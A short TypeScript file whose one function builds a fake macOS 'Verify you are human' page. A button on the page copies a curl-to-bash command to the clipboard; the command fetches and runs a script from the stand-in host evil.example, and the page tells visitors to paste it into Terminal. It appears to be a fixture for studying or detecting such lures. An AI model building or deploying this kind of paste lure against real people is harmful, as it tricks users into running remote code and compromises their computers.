/** A macOS paste lure. The command stays in this file. */
export function macosLurePage(): string {
  const command = '/bin/bash -c "$(curl -fsSL https://evil.example/install.sh)"';
  const attr = command.replace(/&/g, "&amp;").replace(/"/g, "&quot;");
  return `<!doctype html><title>Verify</title><h1>Verify you are human</h1><p>Press Cmd+Space. Open Terminal and paste.</p><button id="copy" data-cmd="${attr}" onclick="var t=document.createElement('textarea');t.value=this.getAttribute('data-cmd');t.style.position='fixed';t.style.left='-9999px';document.body.appendChild(t);t.select();document.execCommand('copy');">Copy</button>`;
}
